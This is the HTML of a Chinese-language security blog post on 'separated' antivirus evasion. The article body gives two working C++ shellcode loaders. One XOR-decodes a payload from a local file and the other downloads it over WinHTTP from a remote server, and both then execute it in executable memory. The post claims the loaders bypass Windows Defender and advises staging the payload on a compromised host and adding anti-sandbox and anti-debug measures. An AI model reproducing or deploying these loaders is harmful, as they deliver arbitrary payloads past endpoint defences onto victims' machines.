@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言做了这么多演练，一直觉得shellcode硬编码在loader里实际上是一种比较别扭的方式，一直也想去简单实现一个，但奈何每次来活的时候，把以前的loader改一改总能临时上个线满足需求。 shellcode落地1.将shellcode放在本地 2.通过fstream库中的相关函数获取到shellcode 3.异或解密shellcode 4.执行shellcode 示例代码:123456789">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈分离免杀">
+<meta property="og:url" content="https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/index.html">
+<meta property="og:site_name" content="cl4ym0re">
+<meta property="og:description" content="前言做了这么多演练，一直觉得shellcode硬编码在loader里实际上是一种比较别扭的方式，一直也想去简单实现一个，但奈何每次来活的时候，把以前的loader改一改总能临时上个线满足需求。 shellcode落地1.将shellcode放在本地 2.通过fstream库中的相关函数获取到shellcode 3.异或解密shellcode 4.执行shellcode 示例代码:123456789">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/defender.png">
+<meta property="article:published_time" content="2023-03-08T03:57:42.000Z">
+<meta property="article:modified_time" content="2023-03-08T04:01:44.659Z">
+<meta property="article:author" content="cl4ym0re">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/defender.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>浅谈分离免杀</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/cl4ym0re">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&text=浅谈分离免杀"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&title=浅谈分离免杀"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&is_video=false&description=浅谈分离免杀"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=浅谈分离免杀&body=Check out this article: https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&title=浅谈分离免杀"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&title=浅谈分离免杀"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&title=浅谈分离免杀"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&title=浅谈分离免杀"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&name=浅谈分离免杀&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&t=浅谈分离免杀"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E8%90%BD%E5%9C%B0"><span class="toc-number">2.</span> <span class="toc-text">shellcode落地</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">示例代码:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E4%B8%8D%E8%90%BD%E5%9C%B0"><span class="toc-number">3.</span> <span class="toc-text">shellcode不落地</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-1"><span class="toc-number">3.1.</span> <span class="toc-text">示例代码:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%95%88%E6%9E%9C"><span class="toc-number">4.</span> <span class="toc-text">免杀效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tips"><span class="toc-number">5.</span> <span class="toc-text">tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        浅谈分离免杀
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">cl4ym0re</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-08T03:57:42.000Z" itemprop="datePublished">2023-03-08</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做了这么多演练，一直觉得shellcode硬编码在loader里实际上是一种比较别扭的方式，一直也想去简单实现一个，但奈何每次来活的时候，把以前的loader改一改总能临时上个线满足需求。</p>
+<h2 id="shellcode落地"><a href="#shellcode落地" class="headerlink" title="shellcode落地"></a>shellcode落地</h2><p>1.将shellcode放在本地</p>
+<p>2.通过fstream库中的相关函数获取到shellcode</p>
+<p>3.异或解密shellcode</p>
+<p>4.执行shellcode</p>
+<h3 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码:"></a>示例代码:</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="function">ifstream <span class="title">binFile</span><span class="params">(<span class="string">&quot;AppResource.dat&quot;</span>, ios::binary)</span></span>;</span><br><span class="line">	<span class="keyword">if</span> (!binFile)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无法打开文件&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	binFile.<span class="built_in">seekg</span>(<span class="number">0</span>, binFile.end);</span><br><span class="line">	<span class="type">int</span> length = binFile.<span class="built_in">tellg</span>();</span><br><span class="line">	binFile.<span class="built_in">seekg</span>(<span class="number">0</span>, binFile.beg);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *buf = <span class="keyword">new</span> <span class="type">char</span>[length];</span><br><span class="line">	binFile.<span class="built_in">read</span>(buf, length);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[i] = buf[i] ^ <span class="number">88</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *mem = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(mem, buf, length);</span><br><span class="line">	((<span class="built_in">void</span>(*)())mem)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">VirtualFree</span>(mem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">	<span class="keyword">delete</span>[] buf;</span><br><span class="line">	binFile.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="shellcode不落地"><a href="#shellcode不落地" class="headerlink" title="shellcode不落地"></a>shellcode不落地</h2><p>1.将shellcode放在公网服务器上</p>
+<p>2.通过winHttp库的相关函数获取到shellcode</p>
+<p>3.异或解密执行shellcode</p>
+<p>4.执行shellcode</p>
+<h3 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码:"></a>示例代码:</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Winhttp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;Winhttp.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    HINTERNET hSession = <span class="built_in">WinHttpOpen</span>(<span class="string">L&quot;Opera/9.20 (Windows NT 6.0; U; en)&quot;</span>, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, <span class="number">0</span>);</span><br><span class="line">    HINTERNET hConnect = <span class="built_in">WinHttpConnect</span>(hSession, <span class="string">L&quot;192.168.x.x&quot;</span>, <span class="number">8080</span>, <span class="number">0</span>);</span><br><span class="line">    HINTERNET hRequest = <span class="built_in">WinHttpOpenRequest</span>(hConnect, <span class="string">L&quot;GET&quot;</span>, <span class="string">L&quot;/AppResource.dat&quot;</span>, <span class="literal">NULL</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">    DWORD dwDownloaded = <span class="number">0</span>;</span><br><span class="line">    DWORD uFileSize = <span class="number">0</span>;</span><br><span class="line">    DWORD uBytesRead = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WinHttpQueryDataAvailable</span>(hRequest, &amp;dwSize);</span><br><span class="line">    uFileSize = dwSize;</span><br><span class="line"></span><br><span class="line">    LPVOID lpEncryptedShellcode = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, (SIZE_T)uFileSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="built_in">WinHttpReadData</span>(hRequest, lpEncryptedShellcode, dwSize, &amp;dwDownloaded);</span><br><span class="line"></span><br><span class="line">    LPVOID lpDecryptedShellcode = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, (SIZE_T)dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; dwSize; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *((BYTE*)lpDecryptedShellcode + i) = *((BYTE*)lpEncryptedShellcode + i) ^ <span class="number">88</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">void</span> (*pShellcode)() = (<span class="built_in">void</span>(*)())lpDecryptedShellcode;</span><br><span class="line">    <span class="built_in">pShellcode</span>();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">VirtualFree</span>(lpEncryptedShellcode, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WinHttpCloseHandle</span>(hRequest);</span><br><span class="line">    <span class="built_in">WinHttpCloseHandle</span>(hConnect);</span><br><span class="line">    <span class="built_in">WinHttpCloseHandle</span>(hSession);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="免杀效果"><a href="#免杀效果" class="headerlink" title="免杀效果"></a>免杀效果</h2><p>只测了下defender<br><img src="/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/defender.png" alt="defender"></p>
+<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>实战中肯定不能直接将示例代码拿来直接使用，需要进行一些修改（shellcode需要放在傀儡机上，代码本身的变量名，函数名，执行逻辑需要结合具体需求进行更改，也包括加反沙箱，反调试，syscall，beacon内存的处理等等）</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/win32/winhttp/using-winhttp">使用 WinHTTP - Win32 apps | Microsoft Learn</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/cl4ym0re">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E8%90%BD%E5%9C%B0"><span class="toc-number">2.</span> <span class="toc-text">shellcode落地</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">示例代码:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode%E4%B8%8D%E8%90%BD%E5%9C%B0"><span class="toc-number">3.</span> <span class="toc-text">shellcode不落地</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-1"><span class="toc-number">3.1.</span> <span class="toc-text">示例代码:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%95%88%E6%9E%9C"><span class="toc-number">4.</span> <span class="toc-text">免杀效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tips"><span class="toc-number">5.</span> <span class="toc-text">tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&text=浅谈分离免杀"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&title=浅谈分离免杀"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&is_video=false&description=浅谈分离免杀"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=浅谈分离免杀&body=Check out this article: https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&title=浅谈分离免杀"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&title=浅谈分离免杀"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&title=浅谈分离免杀"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&title=浅谈分离免杀"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&name=浅谈分离免杀&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://cl4ym0re.github.io/%E6%B5%85%E8%B0%88%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80/&t=浅谈分离免杀"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    cl4ym0re
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/cl4ym0re">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
